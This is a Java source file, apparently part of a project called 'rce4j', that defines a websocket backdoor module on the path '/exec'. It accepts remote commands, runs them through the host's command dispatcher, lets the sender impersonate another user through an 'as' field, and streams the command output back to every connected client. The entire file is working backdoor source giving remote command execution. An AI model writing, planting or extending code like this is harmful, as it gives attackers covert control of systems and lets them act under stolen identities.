package org.rce4j.module.impl.ws;

import net.chococaker.jjason.JsonObject;
import net.chococaker.jjason.JsonPrimitive;
import org.rce4j.command.CommandLine;
import org.rce4j.module.BackdoorWsModule;
import org.rce4j.module.ModulePath;
import org.rce4j.module.event.BackdoorWsEvent;
import org.rce4j.net.WsConnection;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CommandLineModule extends BackdoorWsModule {
    public CommandLineModule(CommandLine commandLine) {
        super("commandline", new ModulePath("/exec"));
        this.commandLine = commandLine;
        
        commandLine.getCommandStream().addHandler(this::sendLine);
    }
    
    private static final int THREAD_COUNT = 5;
    private final ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);
    
    private final CommandLine commandLine;
    
    @Override
    public void onMessage(BackdoorWsEvent event) {
        JsonObject json = event.getBody();
        
        String content = json.getAsJsonPrimitive("content").getAsString();
        JsonPrimitive spoofedElement = json.getAsJsonPrimitive("as");
        String spoofed = spoofedElement == null ? null : spoofedElement.getAsString();
        
        if (spoofed == null) {
            commandLine.dispatchCommand(content);
        } else {
            commandLine.dispatchCommand(content, spoofed);
        }
    }
    
    private void sendLine(String line) {
        JsonObject object = new JsonObject();
        object.set("content", new JsonPrimitive(line));
        String sentLine = object.toString();
        
        for (WsConnection connection : getConnections()) {
            executor.execute(() -> connection.send(sentLine));
        }
    }
}
